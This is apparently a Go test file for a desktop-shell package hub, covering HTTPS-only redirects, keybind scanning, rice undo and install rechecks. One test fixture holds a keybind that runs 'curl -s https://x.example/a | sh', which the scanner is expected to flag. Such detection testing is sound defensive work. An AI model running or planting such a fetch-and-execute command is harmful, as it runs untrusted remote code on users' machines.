package hub

import (
	"archive/tar"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"ano/anod/internal/config"
)

func TestRedirectsHTTPSOnly(t *testing.T) {
	h, c, _ := setup(t)
	plain := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"items":[]}`)) }))
	defer plain.Close()
	redir := httptest.NewTLSServer(http.RedirectHandler(plain.URL+"/index.json", http.StatusFound))
	defer redir.Close()
	h.Client = redir.Client()
	if err := h.fetchCatalog(redir.URL + "/index.json"); err == nil || !strings.Contains(err.Error(), "only https") {
		t.Fatalf("http redirect followed: %v", err)
	}
	var loop *httptest.Server
	loop = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, loop.URL+r.URL.Path+"x", http.StatusFound)
	}))
	defer loop.Close()
	h.Client = loop.Client()
	if err := h.fetchCatalog(loop.URL + "/i"); err == nil || !strings.Contains(err.Error(), "too many redirects") {
		t.Fatalf("redirect loop: %v", err)
	}
	_ = c
}

func TestRiceKeybindsAreCode(t *testing.T) {
	h, c, _ := setup(t)
	a := targz(t,
		tarEnt{name: "rice.json", body: `{"name":"K","version":"1.0.0","config":{}}`},
		tarEnt{name: "keybinds.json", body: `{"binds":[{"chord":"Super+X","action":"exec","args":["curl -s https://x.example/a | sh"]}],"hyprlandHelpers":"x()"}`})
	c.put(Entry{ID: "kb", Type: "rices", Version: "1.0.0"}, a, a)
	bad := targz(t, tarEnt{name: "rice.json", body: `{"name":"B"}`}, tarEnt{name: "keybinds.json", body: `{"binds":{}}`})
	c.put(Entry{ID: "bad", Type: "rices", Version: "1.0.0"}, bad, bad)
	h.Refresh("")
	p, err := h.Prepare("rices", "kb", "")
	if err != nil {
		t.Fatal(err)
	}
	has := func(rule string) bool {
		return slices.ContainsFunc(p.Findings, func(f Finding) bool { return f.Rule == rule })
	}
	if !p.Code || !has("pipe-shell") || !has("undeclared-host") || !has("keybinds-dropped") || len(p.Keybinds) != 1 {
		t.Fatalf("rice keybinds not treated as code: %+v", p)
	}
	h.Commit(p.Token)
	res, _ := h.List("rices")
	if len(res.Items) != 1 || !res.Items[0].Code || len(res.Items[0].Keybinds) != 1 || len(res.Items[0].KeybindsDropped) != 1 {
		t.Fatalf("listed %+v", res.Items)
	}
	if _, err := h.Prepare("rices", "bad", ""); err == nil || !strings.Contains(err.Error(), "keybinds") {
		t.Fatalf("invalid keybinds accepted: %v", err)
	}
}

func TestRiceUndoKeepsLaterChanges(t *testing.T) {
	h, _, tmp := setup(t)
	cfgDir := filepath.Join(tmp, ".config/anoshell")
	rice := filepath.Join(cfgDir, "rices/r")
	os.MkdirAll(rice+"/themes", 0o755)
	os.WriteFile(rice+"/rice.json", []byte(`{"name":"R","config":{
		"appearance":{"look":"ink","transparency":{"contentTransparency":"lots","enable":true}},
		"bar":{"style":0},"panelFamily":{"x":1},"anoSpot":7}}`), 0o644)
	os.WriteFile(rice+"/themes/t.json", []byte(`{}`), 0o644)
	if h.LastRice() != nil {
		t.Fatal("nothing applied yet")
	}
	// no config.json yet: the apply creates it, undo must not delete it
	if _, err := h.RiceApply("r", nil); err != nil {
		t.Fatal(err)
	}
	m, _ := config.Load(config.UserPath())
	if v, _ := config.Get(m, "appearance.look"); v != "ink" {
		t.Fatalf("config %v", m)
	}
	for _, k := range []string{"appearance.transparency.contentTransparency", "bar", "panelFamily", "anoSpot"} {
		if _, ok := config.Get(m, k); ok {
			t.Errorf("%s: wrong type or object replaced, but applied", k)
		}
	}
	if v, _ := config.Get(m, "appearance.transparency.enable"); v != true {
		t.Error("typed leaf next to a bad one was dropped")
	}
	if lr := h.LastRice(); lr == nil || lr.ID != "r" || lr.Name != "R" {
		t.Fatalf("lastRice %+v", lr)
	}
	if res, _ := h.List(""); res.LastRice == nil {
		t.Fatal("hub.list has no lastRice")
	}

	// a later edit to another key survives undo
	config.Set(m, "time.format", "hh:mm")
	b, _ := json.Marshal(m)
	os.WriteFile(config.UserPath(), b, 0o644)
	// a later edit to a file the rice created blocks undo
	os.WriteFile(cfgDir+"/themes/t.json", []byte(`{"mine":1}`), 0o644)
	if err := h.RiceUndo(); err == nil || !strings.Contains(err.Error(), "t.json") {
		t.Fatalf("undo over a changed file: %v", err)
	}
	os.WriteFile(cfgDir+"/themes/t.json", []byte(`{}`), 0o644)
	if err := h.RiceUndo(); err != nil {
		t.Fatal(err)
	}
	m, err := config.Load(config.UserPath())
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(config.UserPath()); err != nil {
		t.Fatal("undo deleted config.json")
	}
	if v, _ := config.Get(m, "time.format"); v != "hh:mm" {
		t.Fatal("undo discarded a later change")
	}
	if _, ok := config.Get(m, "appearance.look"); ok {
		t.Fatal("rice key not removed")
	}
	if fileExists(cfgDir + "/themes/t.json") {
		t.Fatal("created theme kept")
	}
	if h.LastRice() != nil {
		t.Fatal("undo record kept")
	}
}

func TestCommitRechecksAndEntryCount(t *testing.T) {
	h, c, tmp := setup(t)
	a := targz(t, tarEnt{name: "ocean.json", body: "{}"})
	c.put(Entry{ID: "ocean", Type: "themes", Version: "1.0.0"}, a, a)
	h.Refresh("")
	p, err := h.Prepare("themes", "ocean", "")
	if err != nil {
		t.Fatal(err)
	}
	mine := filepath.Join(tmp, ".config/anoshell/themes/ocean.json")
	os.WriteFile(mine, []byte(`{"mine":1}`), 0o644)
	if _, err := h.Commit(p.Token); err == nil {
		t.Fatal("committed over a user file made after prepare")
	}
	if b, _ := os.ReadFile(mine); string(b) != `{"mine":1}` {
		t.Fatal("user file replaced")
	}
	var ents []tarEnt
	for i := 0; i < MaxFiles; i++ {
		ents = append(ents, tarEnt{name: fmt.Sprintf("d%d", i), flag: tar.TypeDir})
	}
	ents = append(ents, tarEnt{name: "widget.json", body: "{}"})
	if _, err := extract(targz(t, ents...), "widgets", "w", filepath.Join(t.TempDir(), "s")); err == nil {
		t.Fatal("folder entries not counted")
	}
}
